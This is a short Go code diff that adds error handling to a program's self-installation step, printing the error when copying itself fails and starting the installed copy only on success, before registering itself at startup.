@@ -18,9 +18,13 @@ func main() {
 	}
 
 	if !install.IsInstalled(Config.Install) {
-		file, _ := install.Install(Config.Name, Config.Install)
-		exec.Command(file).Start()
-		return
+		file, err := install.Install(Config.Name, Config.Install)
+		if err != nil {
+			fmt.Println("install:", err.Error())
+		} else {
+			exec.Command(file).Start()
+			return
+		}
 	}
 
 	err = startup.InstallCurrent(Config.Name)
